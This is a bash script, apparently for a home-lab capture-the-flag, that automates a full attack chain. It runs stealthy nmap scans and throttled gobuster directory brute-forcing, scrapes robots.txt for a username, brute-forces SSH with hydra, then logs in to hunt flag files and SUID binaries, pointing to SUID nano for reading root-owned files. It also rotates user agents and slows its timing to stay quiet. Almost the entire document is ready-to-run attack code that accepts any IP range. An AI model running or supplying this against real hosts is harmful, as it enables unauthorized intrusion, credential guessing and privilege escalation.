#!/usr/bin/env bash
# ============================================================
#  Home Lab CTF Scanner
# ============================================================

set -euo pipefail

# ── Colours ────────────────────────────────────────────────
RED='\033[0;31m'; YELLOW='\033[1;33m'; GREEN='\033[0;32m'
CYAN='\033[0;36m'; BOLD='\033[1m'; RESET='\033[0m'

# ── Config ─────────────────────────────────────────────────
TARGET="10.30.0.250"
TARGET_HTTP_PORT="8080"
TARGET_SSH_PORT="2222"
WORDLIST="/usr/share/seclists/Discovery/Web-Content/common.txt"
HYDRA_WORDLIST="/usr/share/wordlists/fasttrack.txt"
SSH_USER="gazelle"
SSH_PASS=""   # populated by hydra result

IP_RANGE=""

USER_AGENTS=(
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0"
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/123.0"
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15"
)

EXCLUDE_HOSTS=("10.30.0.1" "10.30.0.235")
EXCLUDE_CSV="$(IFS=,; echo "${EXCLUDE_HOSTS[*]}")"

# ── Helpers ────────────────────────────────────────────────
banner() {
  local text="$1" char="${2:-=}"
  local line; line="$(printf '%0.s'"$char" {1..60})"
  echo -e "\n${BOLD}${CYAN}${line}\n  ${text}\n${line}${RESET}"
}

info()  { echo -e "${GREEN}[*]${RESET} $*"; }
warn()  { echo -e "${YELLOW}[!]${RESET} $*"; }
err()   { echo -e "${RED}[!]${RESET} $*" >&2; }
found() { echo -e "${BOLD}${RED}[+]${RESET} $*"; }

random_user_agent() {
  echo "${USER_AGENTS[$((RANDOM % ${#USER_AGENTS[@]}))]}"
}

is_excluded() {
  local h="$1"
  for e in "${EXCLUDE_HOSTS[@]}"; do [[ "$e" == "$h" ]] && return 0; done
  return 1
}

# ── Root check ─────────────────────────────────────────────
if [[ $EUID -ne 0 ]]; then
  err "nmap SYN scanning requires root. Re-run with: sudo bash $0"
  exit 1
fi

# ── Argument parsing ───────────────────────────────────────
usage() {
  echo "Usage: sudo bash $0 [-r <CIDR>] [-w <wordlist>]"
  echo "  -r  IP range in CIDR notation  (e.g. 10.30.0.0/24)"
  echo "  -w  Path to gobuster wordlist"
  exit 0
}

while getopts ":r:w:h" opt; do
  case $opt in
    r) IP_RANGE="$OPTARG" ;;
    w) WORDLIST="$OPTARG" ;;
    h) usage ;;
    :) err "Option -$OPTARG requires an argument."; exit 1 ;;
    \?) err "Unknown option: -$OPTARG"; exit 1 ;;
  esac
done

if [[ -z "$IP_RANGE" ]]; then
  read -rp "Enter IP range to scan (e.g. 10.30.0.0/24): " IP_RANGE
  [[ -z "$IP_RANGE" ]] && { err "No IP range provided."; exit 1; }
fi

# ── Dependency install ─────────────────────────────────────
check_or_install() {
  local tool="$1" pkg="${2:-$1}"
  if ! command -v "$tool" &>/dev/null; then
    warn "'$tool' not found — attempting install..."
    if command -v apt-get &>/dev/null; then
      apt-get update -qq && apt-get install -y "$pkg" -qq
    elif command -v dnf &>/dev/null; then
      dnf install -y "$pkg" -q
    elif command -v pacman &>/dev/null; then
      pacman -Sy --noconfirm "$pkg"
    else
      err "No supported package manager found."; return 1
    fi
    info "'$pkg' installed."
  fi
}

banner "Installing / verifying dependencies"
check_or_install nmap nmap
check_or_install gobuster gobuster
check_or_install hydra hydra
check_or_install sshpass sshpass
check_or_install curl curl

# Install wordlists & seclists if missing
install_wordlists() {
  if [[ ! -d /usr/share/wordlists ]]; then
    warn "wordlists not found — installing..."
    if command -v apt-get &>/dev/null; then
      apt-get install -y wordlists -qq
    fi
  fi

  if [[ ! -d /usr/share/seclists ]]; then
    warn "seclists not found — installing..."
    if command -v apt-get &>/dev/null; then
      apt-get install -y seclists -qq
    else
      warn "Install seclists manually: https://github.com/danielmiessler/SecLists"
    fi
  fi

  # Unpack rockyou if packed
  local rk="/usr/share/wordlists/rockyou.txt.gz"
  if [[ -f "$rk" && ! -f "${rk%.gz}" ]]; then
    info "Unpacking rockyou.txt..."
    gunzip "$rk"
  fi

  info "Wordlists ready."
}

install_wordlists

# ── Phase 1: nmap discovery ────────────────────────────────
HOSTS_2222=()
HOSTS_8080=()

run_nmap() {
  banner "Low-noise SYN scan → ${IP_RANGE} (ports 2222, 8080)"

  local tmp
  tmp="$(mktemp)"

  local exclude_arg=""
  [[ -n "$EXCLUDE_CSV" ]] && exclude_arg="--exclude $EXCLUDE_CSV"

  nmap \
    -sS \
    -T2 \
    -p 2222,8080 \
    --randomize-hosts \
    --max-retries 2 \
    --scan-delay 100ms \
    $exclude_arg \
    -oG "$tmp" \
    "$IP_RANGE" \
    | grep -E "^(Host|Ports|#)" || true

  echo ""

  while IFS= read -r line; do
    [[ "$line" =~ ^Host: ]] || continue
    local host
    host=$(echo "$line" | awk '{print $2}')
    is_excluded "$host" && continue

    echo "$line" | grep -q "2222/open" && HOSTS_2222+=("$host")
    echo "$line" | grep -q "8080/open" && HOSTS_8080+=("$host")
  done < "$tmp"

  rm -f "$tmp"
}

run_nmap

info "Hosts with port 2222 open: ${HOSTS_2222[*]:-none}"
info "Hosts with port 8080 open: ${HOSTS_8080[*]:-none}"

# ── Phase 2: targeted follow-up scan ──────────────────────
run_followup_scan() {
  local host="$1"
  is_excluded "$host" && return

  banner "Targeted follow-up → ${host}" "-"
  nmap -sS -T2 -Pn -p 2222,8080 "$host"
}

for host in "${HOSTS_8080[@]:-}"; do
  [[ -n "$host" ]] && run_followup_scan "$host"
done

# ── Phase 3: gobuster ──────────────────────────────────────
ROBOTS_PATH=""

run_gobuster() {
  local host="$1"
  local url="http://${host}:${TARGET_HTTP_PORT}"
  is_excluded "$host" && return

  if [[ ! -f "$WORDLIST" ]]; then
    warn "Wordlist not found at $WORDLIST — skipping gobuster."
    return
  fi

  banner "Gobuster → ${url}" "-"
  info "Threads: 5 | Delay: 750ms | Wordlist: $WORDLIST"
  echo ""

  local found_robots=0

  while IFS= read -r line; do
    if [[ -n "$line" ]]; then
      echo "  $line"
      # Detect robots.txt in gobuster output
      if echo "$line" | grep -qi "robots"; then
        ROBOTS_PATH="/robots.txt"
        found_robots=1
      fi
    fi
  done < <(
    gobuster dir \
      -u "$url" \
      -w "$WORDLIST" \
      -t 5 \
      --delay 750ms \
      --no-error \
      -q 2>/dev/null || true
  )

  echo ""
  [[ $found_robots -eq 1 ]] && found "robots.txt detected!"
}

for host in "${HOSTS_8080[@]:-}"; do
  [[ -n "$host" ]] && run_gobuster "$host"
done

# ── Phase 4: fetch robots.txt ──────────────────────────────
DISCOVERED_USER=""

fetch_robots() {
  local host="$1"
  local url="http://${host}:${TARGET_HTTP_PORT}${ROBOTS_PATH}"
  is_excluded "$host" && return

  if [[ -z "$ROBOTS_PATH" ]]; then
    warn "No robots.txt path found from gobuster — skipping."
    return
  fi

  banner "Fetching robots.txt → ${url}" "-"

  local body
  body="$(curl -s "$url")"
  echo "$body"
  echo ""

  # Parse username from robots.txt (look for lines suggesting a user)
  local user
  user="$(echo "$body" | grep -oiE 'User(-name)?[[:space:]]*:[[:space:]]*[a-zA-Z0-9_-]+' \
          | awk -F: '{print $NF}' | tr -d ' ' | head -1)"

  if [[ -z "$user" ]]; then
    # Fallback: grab any standalone word that looks like a username
    user="$(echo "$body" | grep -vE '^#|^$|User-agent|Disallow|Allow' \
            | grep -oE '[a-zA-Z][a-zA-Z0-9_-]{2,}' | head -1)"
  fi

  if [[ -n "$user" ]]; then
    DISCOVERED_USER="$user"
    found "Discovered username: ${DISCOVERED_USER}"
  else
    warn "Could not auto-parse username; defaulting to '${SSH_USER}'"
    DISCOVERED_USER="$SSH_USER"
  fi
}

for host in "${HOSTS_8080[@]:-}"; do
  [[ -n "$host" ]] && fetch_robots "$host"
done

# Use discovered user or default
[[ -n "$DISCOVERED_USER" ]] && SSH_USER="$DISCOVERED_USER"
info "Using SSH username: ${SSH_USER}"

# ── Phase 5: hydra brute force ─────────────────────────────
run_hydra() {
  local host="$1"
  is_excluded "$host" && return

  if [[ ! -f "$HYDRA_WORDLIST" ]]; then
    warn "Hydra wordlist not found at $HYDRA_WORDLIST — skipping brute force."
    return
  fi

  banner "Hydra SSH brute force → ssh://${host}:${TARGET_SSH_PORT}" "-"
  info "User: ${SSH_USER} | Wordlist: ${HYDRA_WORDLIST}"
  warn "This may take a while with -t 1 (single thread, 10s wait)"
  echo ""

  local hydra_out
  hydra_out="$(
    hydra \
      -t 1 \
      -W 10 \
      -f \
      -l "$SSH_USER" \
      -P "$HYDRA_WORDLIST" \
      "ssh://${host}:${TARGET_SSH_PORT}" 2>&1 || true
  )"

  echo "$hydra_out"
  echo ""

  # Parse discovered password
  local pass
  pass="$(echo "$hydra_out" \
          | grep -oP '(?<=password: )\S+' \
          | head -1)"

  if [[ -n "$pass" ]]; then
    SSH_PASS="$pass"
    found "Credentials found → ${SSH_USER}:${SSH_PASS}"
  else
    warn "Hydra did not find credentials automatically."
    read -rp "Enter password manually (or press Enter to skip SSH phase): " SSH_PASS
  fi
}

for host in "${HOSTS_2222[@]:-}"; do
  [[ -n "$host" ]] && run_hydra "$host"
done

# ── Phase 6: SSH enumeration ───────────────────────────────
run_ssh_enum() {
  local host="$1"
  is_excluded "$host" && return

  if [[ -z "$SSH_PASS" ]]; then
    warn "No SSH password available — skipping SSH phase."
    return
  fi

  banner "SSH Enumeration → ${SSH_USER}@${host}:${TARGET_SSH_PORT}" "-"

  local ssh_opts="-o StrictHostKeyChecking=no -o BatchMode=no -p ${TARGET_SSH_PORT}"

  # ── find flag.txt ──────────────────────────────────────
  info "Step 1: Searching for flag.txt..."
  local find1_out
  find1_out="$(
    sshpass -p "$SSH_PASS" ssh $ssh_opts \
      "${SSH_USER}@${host}" \
      "find / -iname flag.txt 2>/dev/null" 2>/dev/null || true
  )"

  if [[ -n "$find1_out" ]]; then
    found "flag.txt locations:"
    echo "$find1_out"
    echo ""
  else
    warn "No flag.txt found with initial find."
  fi

  # ── find SUID binaries ─────────────────────────────────
  info "Step 2: Searching for SUID binaries..."
  local suid_out
  suid_out="$(
    sshpass -p "$SSH_PASS" ssh $ssh_opts \
      "${SSH_USER}@${host}" \
      "find / -perm /4000 2>/dev/null" 2>/dev/null || true
  )"

  if [[ -n "$suid_out" ]]; then
    found "SUID binaries found:"
    echo "$suid_out"
    echo ""

    if echo "$suid_out" | grep -q "/usr/bin/nano"; then
      found "/usr/bin/nano has SUID bit set — can read privileged files!"
    fi
  else
    warn "No SUID binaries returned."
  fi

  # ── Read /root/Flag.txt via SUID nano ─────────────────
  # nano is interactive so we open an SSH session for the user to run it.
  banner "Step 3: Read /root/Flag.txt via SUID nano" "-"
  warn "nano is interactive — dropping you into an SSH shell."
  warn "Run the following command once connected:"
  echo ""
  echo -e "  ${BOLD}${CYAN}nano /root/Flag.txt${RESET}"
  echo ""
  info "Opening SSH session now..."
  echo ""

  sshpass -p "$SSH_PASS" ssh \
    -o StrictHostKeyChecking=no \
    -p "$TARGET_SSH_PORT" \
    "${SSH_USER}@${host}"
}

for host in "${HOSTS_2222[@]:-}"; do
  [[ -n "$host" ]] && run_ssh_enum "$host"
done

banner "Script complete" "*"